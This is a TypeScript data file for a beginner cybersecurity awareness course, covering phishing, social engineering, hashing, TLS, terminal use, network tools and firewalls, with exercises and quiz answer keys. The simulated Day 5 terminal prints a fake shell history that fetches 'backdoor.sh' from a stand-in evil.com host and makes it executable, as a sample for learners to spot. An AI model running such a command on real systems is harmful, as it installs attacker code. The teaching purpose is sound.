export interface QuizOption {
  label: string;
  value: string;
}

export interface Exercise {
  type: "input" | "terminal" | "choice";
  prompt: string;
  placeholder?: string;
  validator: (input: string) => { correct: boolean; hint: string };
  terminalCommands?: Record<string, (args: string) => string>;
}

export interface Quiz {
  question: string;
  options: QuizOption[];
  correct: string;
  explanation: string;
}

export interface DayData {
  day: number;
  title: string;
  hook: string;
  lesson: string[];
  exercise: Exercise;
  quiz: Quiz;
  output: string;
}

export const week1: DayData[] = [
  {
    day: 1,
    title: "Phishing — Spot the Fake URL",
    hook: "You get an email from your bank: \"Your account has been compromised. Click here to verify your identity.\" The link reads https://secure-bankofamerica.com.verify-now.ru/login. Looks legit... or does it?",
    lesson: [
      "Phishing is the #1 attack vector. Over 90% of data breaches start with a phishing email. Attackers craft messages that look legitimate to trick you into clicking malicious links or giving away credentials.",
      "The key to spotting a fake URL is reading the domain from right to left. The actual domain is the last part before the TLD (.com, .org, .ru). In our hook example, the real domain is verify-now.ru — a Russian domain, not Bank of America.",
      "Red flags: misspelled brand names (paypa1.com), extra subdomains (login.apple.com.evil.com), HTTP instead of HTTPS, urgency language (\"Act NOW or lose access\"), and generic greetings (\"Dear Customer\").",
      "Always hover over links before clicking. On mobile, long-press to preview. When in doubt, navigate directly to the official website by typing the URL yourself.",
    ],
    exercise: {
      type: "input",
      prompt: "Look at this URL and identify the real domain:\nhttps://login.microsoft.com.account-verify.net/auth\n\nType the actual domain (e.g., example.com):",
      placeholder: "Type the real domain...",
      validator: (input: string) => {
        const clean = input.trim().toLowerCase().replace(/^www\./, "");
        if (clean === "account-verify.net") {
          return { correct: true, hint: "Correct! The real domain is account-verify.net — everything before it is just subdomains designed to trick you." };
        }
        if (clean.includes("microsoft")) {
          return { correct: false, hint: "Not quite. Remember: read the domain from right to left. The real domain is the last part before the path. microsoft.com here is just a subdomain." };
        }
        return { correct: false, hint: "Try reading the URL from right to left. The real domain comes just before the first single slash (/)." };
      },
    },
    quiz: {
      question: "Which URL is most likely a phishing attempt?",
      options: [
        { label: "A", value: "https://accounts.google.com/signin" },
        { label: "B", value: "https://google.com.login-secure.tk/signin" },
        { label: "C", value: "https://mail.google.com/mail/u/0/" },
        { label: "D", value: "https://www.google.com/search?q=security" },
      ],
      correct: "B",
      explanation: "Option B is the phishing URL. The actual domain is login-secure.tk (a free Tokelau domain often used by attackers). 'google.com' is just a subdomain — a classic trick to make the URL look legitimate at first glance.",
    },
    output: "Today you learned how to detect phishing URLs by reading domains right-to-left and spotting red flags in suspicious links.",
  },
  {
    day: 2,
    title: "Social Engineering — The Human Firewall",
    hook: "Your phone rings. \"Hi, this is James from IT. We detected unusual login activity on your account. I need to verify your credentials to secure it before the attacker locks you out.\" Your heart races. What do you do?",
    lesson: [
      "Social engineering exploits human psychology, not technology. Attackers use urgency, authority, and fear to bypass your rational thinking. It's the most effective hacking technique because it targets the weakest link: people.",
      "Common tactics: Pretexting (fake scenarios), Baiting (free USB drives with malware), Quid pro quo (\"I'll fix your computer if you give me access\"), and Tailgating (following someone through a secure door).",
      "The caller in our scenario used two classic triggers: Authority (\"I'm from IT\") and Urgency (\"before the attacker locks you out\"). Real IT departments will never ask for your password over the phone.",
      "Defense: Always verify through a separate channel. Hang up and call IT directly using the official number. Never share credentials verbally. If something feels rushed or pressured, that's your signal to slow down.",
    ],
    exercise: {
      type: "choice",
      prompt: "You receive this message from your \"CEO\" on Slack:\n\n\"Hey, I need you to buy 5 Apple gift cards ($200 each) for a client meeting ASAP. Don't tell anyone — it's a surprise. Send me the codes when you have them.\"\n\nWhat's the best response?",
      placeholder: "",
      validator: (input: string) => {
        const choice = input.trim().toUpperCase();
        if (choice === "C") {
          return { correct: true, hint: "Correct! Always verify unusual requests through a separate, trusted channel. This is a classic CEO fraud / Business Email Compromise (BEC) scam." };
        }
        if (choice === "A") {
          return { correct: false, hint: "Never comply with urgent financial requests without verification. Gift card requests are a hallmark of BEC scams — legitimate executives don't ask for gift cards." };
        }
        if (choice === "B") {
          return { correct: false, hint: "While questioning is good, the attacker controls this channel. They'll have a convincing answer ready. Always verify through a SEPARATE channel." };
        }
        if (choice === "D") {
          return { correct: false, hint: "Ignoring is better than complying, but reporting it helps protect others in your organization from the same attack." };
        }
        return { correct: false, hint: "Choose A, B, C, or D." };
      },
    },
    quiz: {
      question: "What makes social engineering more dangerous than technical hacking?",
      options: [
        { label: "A", value: "It requires expensive tools and software" },
        { label: "B", value: "It exploits human psychology, which can't be patched" },
        { label: "C", value: "It only works against non-technical people" },
        { label: "D", value: "It's easier to detect than malware" },
      ],
      correct: "B",
      explanation: "Social engineering targets human psychology — trust, fear, urgency, and helpfulness. Unlike software vulnerabilities, you can't \"patch\" human nature. That's why security awareness training is critical: your brain is the first and last line of defense.",
    },
    output: "Today you learned how to recognize social engineering tactics and defend against manipulation by verifying requests through separate channels.",
  },
  {
    day: 3,
    title: "Passwords — Hash vs Plain Text",
    hook: "In 2012, LinkedIn was breached. 117 million passwords were stolen. The worst part? They were stored as unsalted SHA-1 hashes — and millions were cracked within hours. Your password \"Summer2012!\" was one of them.",
    lesson: [
      "When you create a password, a responsible system never stores it as plain text. Instead, it runs your password through a hash function — a one-way mathematical transformation that produces a fixed-length string. \"password123\" becomes something like \"ef92b778bafe771e89245b89ecbc08a44a4e166c\".",
      "Hashing is one-way: you can't reverse a hash back to the original password. When you log in, the system hashes your input and compares it to the stored hash. If they match, you're in.",
      "But basic hashing isn't enough. Attackers use rainbow tables (precomputed hash databases) to crack common passwords instantly. That's why modern systems add a \"salt\" — a random string appended to your password before hashing. Same password, different salt = completely different hash.",
      "Modern best practice uses bcrypt, scrypt, or Argon2 — algorithms designed to be intentionally slow, making brute-force attacks impractical. A single bcrypt hash takes ~100ms to compute vs ~1 nanosecond for MD5.",
    ],
    exercise: {
      type: "input",
      prompt: "If a database stores passwords in plain text and gets breached, the attacker sees:\nuser: alice, password: MySecret123\n\nIf it uses hashing, the attacker sees:\nuser: alice, password: $2b$10$X7hK3...\n\nWhat is the key property of a hash function that makes it secure?\n(Hint: it's about the direction of computation)",
      placeholder: "Type your answer...",
      validator: (input: string) => {
        const lower = input.toLowerCase();
        if (lower.includes("one-way") || lower.includes("one way") || lower.includes("irreversible") || lower.includes("can't reverse") || lower.includes("cannot reverse") || lower.includes("not reversible") || lower.includes("cant reverse")) {
          return { correct: true, hint: "Exactly! Hash functions are one-way (irreversible). You can compute a hash from a password, but you cannot compute the password from its hash. This is what protects stored credentials." };
        }
        if (lower.includes("reverse") || lower.includes("backward") || lower.includes("undo")) {
          return { correct: true, hint: "That's right! The key property is that hashing is irreversible — it's a one-way function. An attacker with the hash can't mathematically reverse it to find the password." };
        }
        return { correct: false, hint: "Think about which direction the computation works. You can go from password → hash, but can you go from hash → password?" };
      },
    },
    quiz: {
      question: "Why is salting important even if you use a strong hash algorithm?",
      options: [
        { label: "A", value: "It makes the hash shorter and faster to compute" },
        { label: "B", value: "It ensures two users with the same password get different hashes" },
        { label: "C", value: "It encrypts the hash so attackers can't read it" },
        { label: "D", value: "It converts the hash back to the original password for verification" },
      ],
      correct: "B",
      explanation: "Without salt, every user with the password \"password123\" gets the same hash. An attacker with a rainbow table can crack them all at once. Salt adds randomness so identical passwords produce unique hashes, forcing attackers to crack each one individually.",
    },
    output: "Today you learned how password hashing and salting protect credentials — and why plain-text storage is a catastrophic security failure.",
  },
  {
    day: 4,
    title: "HTTPS vs HTTP — Read the Certificate",
    hook: "You're at a coffee shop, connected to free Wi-Fi. You open your banking app. A warning flashes: \"Your connection is not private.\" You shrug and click \"Proceed anyway.\" Meanwhile, someone at the next table just captured your login session.",
    lesson: [
      "HTTP sends data in plain text. Anyone on the same network can intercept and read everything: passwords, messages, credit card numbers. This is called a Man-in-the-Middle (MitM) attack.",
      "HTTPS wraps HTTP in TLS (Transport Layer Security) encryption. Before any data is exchanged, your browser and the server perform a \"handshake\": the server presents a certificate signed by a trusted Certificate Authority (CA), proving its identity. Your browser then establishes an encrypted tunnel.",
      "Click the padlock icon in your browser to inspect a certificate. Key fields: Issued To (the domain), Issued By (the CA, like Let's Encrypt or DigiCert), Valid From/To (expiration dates), and the fingerprint (a unique hash of the certificate).",
      "Red flags: expired certificates, self-signed certificates on public sites, certificate domain mismatch (certificate for example.com but you're on examp1e.com). Modern browsers block these by default — never bypass the warning.",
    ],
    exercise: {
      type: "input",
      prompt: "You inspect a certificate and see:\n\n  Issued To: *.paypal.com\n  Issued By: DigiCert SHA2 Extended Validation\n  Valid: Jan 2024 – Jan 2025\n  Current Date: March 2025\n\nIs this certificate valid right now? Why or why not?",
      placeholder: "Type your answer...",
      validator: (input: string) => {
        const lower = input.toLowerCase();
        if ((lower.includes("expired") || lower.includes("not valid") || lower.includes("invalid")) && (lower.includes("jan") || lower.includes("2025") || lower.includes("date"))) {
          return { correct: true, hint: "Correct! The certificate expired in January 2025, and the current date is March 2025. An expired certificate means the encrypted connection cannot be trusted — the site owner may have lost control of the domain or the certificate." };
        }
        if (lower.includes("no") || lower.includes("expired") || lower.includes("not valid")) {
          return { correct: true, hint: "Right! The certificate expired in January 2025. In March 2025, it's no longer valid. Expired certificates break the chain of trust — you should not proceed to the site." };
        }
        if (lower.includes("yes") || lower.includes("valid")) {
          return { correct: false, hint: "Look at the dates carefully. The certificate is valid from Jan 2024 to Jan 2025. What's the current date in the scenario?" };
        }
        return { correct: false, hint: "Check the 'Valid' dates against the 'Current Date'. Is March 2025 within the validity window?" };
      },
    },
    quiz: {
      question: "What does the TLS handshake accomplish before data is transmitted?",
      options: [
        { label: "A", value: "It compresses the data to make transmission faster" },
        { label: "B", value: "It verifies the server's identity and establishes an encrypted connection" },
        { label: "C", value: "It scans the server for malware before connecting" },
        { label: "D", value: "It stores your password on the server for future logins" },
      ],
      correct: "B",
      explanation: "The TLS handshake has two critical jobs: (1) verify the server is who it claims to be via its certificate, and (2) negotiate encryption keys to create a secure tunnel. Only after both steps does your browser start sending actual data.",
    },
    output: "Today you learned how to read TLS certificates, understand HTTPS encryption, and why you should never ignore browser security warnings.",
  },
  {
    day: 5,
    title: "Terminal Basics — Your Command Center",
    hook: "Every hacker movie shows a dark screen with green text scrolling. Looks intimidating, right? But the terminal is just a text-based way to talk to your computer. And today, you'll start speaking its language.",
    lesson: [
      "The terminal (or command line) is a text interface to your operating system. Instead of clicking icons, you type commands. It's faster, more powerful, and essential for cybersecurity work.",
      "Essential commands: 'ls' lists files in a directory. 'cd' changes your current directory. 'pwd' prints your current location. 'cat' displays file contents. 'whoami' shows your username.",
      "'grep' searches for patterns in text — invaluable for log analysis. Example: 'grep \"failed login\" /var/log/auth.log' finds all failed login attempts. 'chmod' changes file permissions — controlling who can read, write, or execute a file.",
      "Pro tip: Use 'man <command>' to read the manual for any command. The terminal has a built-in help system. Use Tab for autocompletion and Up arrow for command history.",
    ],
    exercise: {
      type: "terminal",
      prompt: "Try these commands in the terminal below:\n• ls — list files\n• cat secret.txt — read a file\n• whoami — see current user\n• grep \"password\" logs.txt — search in a file\n• pwd — print working directory",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        ls: () => "Desktop  Documents  Downloads  secret.txt  logs.txt  .ssh  .bash_history",
        pwd: () => "/home/analyst",
        whoami: () => "analyst",
        cat: (args: string) => {
          if (args.includes("secret.txt")) return "FLAG{y0u_f0und_th3_s3cr3t}\nThis file contains sensitive credentials.\nAdmin password: ChangeMe123 (rotate immediately!)";
          if (args.includes("logs.txt")) return "[2024-03-15 09:23:11] User admin login successful\n[2024-03-15 09:45:02] User admin password changed\n[2024-03-15 10:12:33] Failed login attempt from 192.168.1.105\n[2024-03-15 10:12:34] Failed login attempt from 192.168.1.105\n[2024-03-15 10:12:35] Failed login attempt from 192.168.1.105\n[2024-03-15 10:15:00] User root login from 192.168.1.105\n[2024-03-15 10:15:01] ALERT: Brute force detected from 192.168.1.105";
          if (args.includes(".bash_history")) return "ssh admin@192.168.1.1\nsudo apt update\nnmap -sV 10.0.0.0/24\nwget http://evil.com/backdoor.sh\nchmod +x backdoor.sh";
          return `cat: ${args || "?"}: No such file or directory`;
        },
        grep: (args: string) => {
          if (args.includes("password") && args.includes("logs")) return "[2024-03-15 09:45:02] User admin password changed";
          if (args.includes("password") && args.includes("secret")) return "Admin password: ChangeMe123 (rotate immediately!)";
          if (args.includes("failed") || args.includes("Failed")) return "[2024-03-15 10:12:33] Failed login attempt from 192.168.1.105\n[2024-03-15 10:12:34] Failed login attempt from 192.168.1.105\n[2024-03-15 10:12:35] Failed login attempt from 192.168.1.105";
          if (args.includes("192.168")) return "[2024-03-15 10:12:33] Failed login attempt from 192.168.1.105\n[2024-03-15 10:12:34] Failed login attempt from 192.168.1.105\n[2024-03-15 10:12:35] Failed login attempt from 192.168.1.105\n[2024-03-15 10:15:00] User root login from 192.168.1.105\n[2024-03-15 10:15:01] ALERT: Brute force detected from 192.168.1.105";
          return `grep: ${args}: No match found`;
        },
        man: (args: string) => `${args.toUpperCase()}(1)\n\nNAME\n    ${args} - ${args === "ls" ? "list directory contents" : args === "grep" ? "search for patterns" : args === "cat" ? "concatenate and print files" : "command manual"}\n\nType 'q' to exit manual.`,
        cd: (args: string) => `analyst@sec-lab:${args || "~"}$`,
        chmod: () => "permissions updated",
        clear: () => "",
        help: () => "Available commands: ls, cd, pwd, cat, grep, whoami, man, chmod, clear, help",
      },
    },
    quiz: {
      question: "You see repeated failed login attempts from IP 192.168.1.105 in the logs, followed by a successful root login from the same IP. What most likely happened?",
      options: [
        { label: "A", value: "A system administrator logged in after multiple typos" },
        { label: "B", value: "A brute-force attack succeeded in guessing the root password" },
        { label: "C", value: "The server automatically granted access after too many attempts" },
        { label: "D", value: "The logs are corrupted and showing false data" },
      ],
      correct: "B",
      explanation: "Multiple rapid failed attempts followed by a successful login from the same IP is the classic signature of a brute-force attack. The attacker systematically tried passwords until finding the right one. This is why account lockout policies and fail2ban are essential defenses.",
    },
    output: "Today you learned terminal basics — navigating files, reading logs, and spotting suspicious activity through the command line.",
  },
  {
    day: 6,
    title: "Networking Tools — Ping, Whois & Traceroute",
    hook: "A website your company relies on is suddenly unreachable. Your boss asks: \"Is it us or them?\" You could shrug... or you could open a terminal and find out in 30 seconds.",
    lesson: [
      "'ping' sends small packets to a host and measures the response time. It tells you if a host is reachable and how fast the connection is. High latency (>200ms) or packet loss suggests network problems. 'ping google.com' sends packets to Google's servers.",
      "'traceroute' (or 'tracert' on Windows) shows every router hop between you and the destination. If a request dies at hop 7, you know exactly where the problem is — maybe your ISP, maybe an intermediate network, maybe the destination's hosting.",
      "'whois' queries domain registration databases. It reveals who owns a domain, when it was registered, and when it expires. Suspicious domain registered yesterday? Probably not legitimate. 'nslookup' and 'dig' resolve domain names to IP addresses.",
      "Combining these tools gives you a complete diagnostic picture: Is the host up? (ping) Where is the connection failing? (traceroute) Who owns the domain? (whois) What IP does it resolve to? (nslookup)",
    ],
    exercise: {
      type: "terminal",
      prompt: "You need to investigate a suspicious domain: malware-download.tk\nUse networking tools to gather intelligence:\n• ping malware-download.tk\n• whois malware-download.tk\n• traceroute malware-download.tk\n• nslookup malware-download.tk",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        ping: (args: string) => {
          if (args.includes("malware-download")) return "PING malware-download.tk (185.234.72.15): 56 data bytes\n64 bytes from 185.234.72.15: icmp_seq=0 ttl=45 time=234.5 ms\n64 bytes from 185.234.72.15: icmp_seq=1 ttl=45 time=289.1 ms\n64 bytes from 185.234.72.15: icmp_seq=2 ttl=45 time=312.7 ms\nRequest timeout for icmp_seq 3\n\n--- malware-download.tk ping statistics ---\n4 packets transmitted, 3 received, 25% packet loss\nround-trip min/avg/max = 234.5/278.8/312.7 ms";
          if (args.includes("google")) return "PING google.com (142.250.80.46): 56 data bytes\n64 bytes from 142.250.80.46: icmp_seq=0 ttl=118 time=11.2 ms\n64 bytes from 142.250.80.46: icmp_seq=1 ttl=118 time=10.8 ms\n64 bytes from 142.250.80.46: icmp_seq=2 ttl=118 time=11.5 ms\n\n--- google.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss\nround-trip min/avg/max = 10.8/11.2/11.5 ms";
          return `PING ${args}: Name or service not known`;
        },
        whois: (args: string) => {
          if (args.includes("malware-download")) return "Domain Name: malware-download.tk\nRegistry Domain ID: D108500000-CNIC\nRegistrar: Freenom / OpenTLD BV\nCreation Date: 2024-03-14T02:15:00Z\nExpiration Date: 2024-06-14T02:15:00Z\nRegistrant Name: REDACTED FOR PRIVACY\nRegistrant Country: RU\nName Server: ns1.suspicious-host.ru\nName Server: ns2.suspicious-host.ru\nDNSSEC: unsigned\n\n>>> NOTICE: This domain was registered 1 day ago.";
          if (args.includes("google")) return "Domain Name: google.com\nRegistrar: MarkMonitor Inc.\nCreation Date: 1997-09-15T04:00:00Z\nRegistrant Organization: Google LLC\nRegistrant Country: US";
          return `No whois data found for ${args}`;
        },
        traceroute: (args: string) => {
          if (args.includes("malware-download")) return "traceroute to malware-download.tk (185.234.72.15), 30 hops max\n 1  router.local (192.168.1.1)  1.2 ms\n 2  isp-gateway.net (10.0.0.1)  12.5 ms\n 3  core-router.isp.net (72.14.233.85)  15.3 ms\n 4  frankfurt-ix.de (80.81.192.108)  89.2 ms\n 5  moscow-peer.ru (195.208.112.1)  156.8 ms\n 6  hosting-ru.suspicious-host.ru (185.234.72.1)  201.3 ms\n 7  malware-download.tk (185.234.72.15)  234.5 ms";
          if (args.includes("google")) return "traceroute to google.com (142.250.80.46), 30 hops max\n 1  router.local (192.168.1.1)  1.1 ms\n 2  isp-gateway.net (10.0.0.1)  11.2 ms\n 3  google-peer.net (72.14.233.85)  11.5 ms\n 4  google.com (142.250.80.46)  11.2 ms";
          return `traceroute: unknown host ${args}`;
        },
        nslookup: (args: string) => {
          if (args.includes("malware-download")) return "Server:  8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\nName:    malware-download.tk\nAddress: 185.234.72.15\n\n> Additional: IP is geolocated to Moscow, Russia\n> Hosting: SuspiciousHost LLC (known bulletproof hosting)";
          if (args.includes("google")) return "Server:  8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\nName:    google.com\nAddress: 142.250.80.46";
          return `** server can't find ${args}: NXDOMAIN`;
        },
        dig: (args: string) => {
          if (args.includes("malware-download")) return ";; ANSWER SECTION:\nmalware-download.tk.  300  IN  A  185.234.72.15\n\n;; Query time: 45 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)";
          return `;; ANSWER SECTION:\n${args}.  300  IN  A  0.0.0.0`;
        },
        help: () => "Available commands: ping, whois, traceroute, nslookup, dig, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "You run whois on a domain and see it was registered yesterday, uses a free TLD (.tk), and its nameservers are hosted in a country known for bulletproof hosting. What should you conclude?",
      options: [
        { label: "A", value: "It's a new startup — probably nothing to worry about" },
        { label: "B", value: "The domain is highly suspicious and likely malicious" },
        { label: "C", value: "Free TLDs are always safe because they're regulated" },
        { label: "D", value: "Whois data is unreliable and shouldn't be used for analysis" },
      ],
      correct: "B",
      explanation: "Multiple red flags: brand-new registration, free TLD (commonly abused by attackers because there's no cost barrier), and bulletproof hosting (providers that ignore abuse complaints). Each flag alone warrants caution — together, they strongly indicate malicious intent.",
    },
    output: "Today you learned how to use ping, whois, traceroute, and nslookup to investigate domains and diagnose network issues like a security analyst.",
  },
  {
    day: 7,
    title: "Firewall + Week Recap Challenge",
    hook: "Your home network has 15 connected devices. Your smart fridge just made an outbound connection to a server in North Korea. Your baby monitor is streaming to an unknown IP. Without a firewall, every device is an open door.",
    lesson: [
      "A firewall is a network security system that monitors and controls incoming and outgoing traffic based on predefined rules. Think of it as a bouncer at a club — it decides what gets in and what gets blocked.",
      "Firewall rules work on a simple principle: ALLOW or DENY traffic based on source IP, destination IP, port number, and protocol. Rules are processed top-to-bottom; the first matching rule wins. A default \"deny all\" policy at the bottom blocks everything not explicitly allowed.",
      "Key ports to know: 80 (HTTP), 443 (HTTPS), 22 (SSH), 53 (DNS), 25 (SMTP/email), 3389 (RDP). If you see traffic on port 4444 or 31337, be suspicious — these are commonly used by backdoors and hacking tools.",
      "Stateful firewalls track active connections and only allow return traffic for established sessions. This means an internal request to a website is allowed back in, but an unsolicited external connection is blocked — even on the same port.",
    ],
    exercise: {
      type: "input",
      prompt: "You're configuring a basic firewall for a web server. It should:\n• Allow incoming HTTPS traffic (port 443)\n• Allow incoming SSH from your IP only (port 22)\n• Block everything else\n\nWhat should the default policy for incoming traffic be?\n(ALLOW or DENY)",
      placeholder: "Type ALLOW or DENY...",
      validator: (input: string) => {
        const clean = input.trim().toUpperCase();
        if (clean === "DENY" || clean === "DENY ALL" || clean === "DROP" || clean === "BLOCK") {
          return { correct: true, hint: "Correct! A 'default deny' policy means only explicitly allowed traffic gets through. This is the fundamental principle of least privilege applied to networking. You then add specific ALLOW rules for ports 443 and 22." };
        }
        if (clean === "ALLOW" || clean === "ACCEPT") {
          return { correct: false, hint: "A default ALLOW policy means any traffic not explicitly blocked gets through. That's dangerous — you'd have to anticipate every possible attack. 'Default deny' is the secure approach: block everything, then whitelist only what's needed." };
        }
        return { correct: false, hint: "The answer should be either ALLOW or DENY. Think about what's safer: allowing everything by default, or blocking everything by default?" };
      },
    },
    quiz: {
      question: "This week you learned about multiple layers of security. Which combination best represents \"defense in depth\"?",
      options: [
        { label: "A", value: "Just a strong password is enough for complete security" },
        { label: "B", value: "Phishing awareness + strong hashed passwords + HTTPS + firewall rules" },
        { label: "C", value: "Only technical tools like firewalls, no need for user training" },
        { label: "D", value: "Relying entirely on antivirus software for all protection" },
      ],
      correct: "B",
      explanation: "Defense in depth combines multiple layers: human awareness (phishing/social engineering training), authentication security (hashed passwords), encryption (HTTPS/TLS), and network controls (firewalls). No single layer is perfect, but together they create a resilient security posture. This is the core lesson of Week 1.",
    },
    output: "You survived the week! You've unlocked 7 essential cybersecurity skills: phishing detection, social engineering defense, password security, HTTPS/TLS analysis, terminal navigation, network reconnaissance, and firewall configuration.",
  },
];
